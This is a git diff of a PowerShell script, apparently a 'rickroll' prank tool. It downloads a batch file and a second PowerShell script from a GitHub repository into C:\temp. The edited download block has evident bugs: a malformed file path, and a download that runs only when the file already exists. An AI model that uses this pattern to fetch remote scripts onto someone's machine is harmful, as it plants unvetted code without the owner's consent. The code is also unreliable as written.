@@ -1,6 +1,7 @@
 $filename = "C:\temp\rickroll.jpg"
 $bat = 'C:\temp\lobster.bat'
-$blue = 'C:\temp\Blue.ps1'
+$filename2 = 'C:\temp\Blue.ps1'
+$url = 'https://github.com/CHONK12/rickRoll/raw/main/Blue.ps1'
 
 #If the file does not exist, create it.
 if (-not(Test-Path -Path $filename -PathType Leaf)) {
@@ -25,7 +26,15 @@ namespace Win32{
 
 if (-not(Test-Path -Path $bat -PathType Leaf)) {
    Invoke-WebRequest -Uri https://github.com/CHONK12/rickRoll/raw/main/Lobster.bat -OutFile C:\temp\lobster.bat
-   Invoke-WebRequest -Uri https://raw.githubusercontent.com/CHONK12/rickRoll/main/Blue.ps1 -OutFile C:\temp\Blue.ps1
+  
+}
+
+if ((Test-Path -Path $filename2 -PathType Leaf)) {
+
+$webclient = New-Object System.Net.WebClient
+$filepath = "$C:\temp\$filename2"
+$webclient.DownloadFile($url,$filepath)
+
 }
 
 if ((Test-Path -Path $filename -PathType Leaf)) {
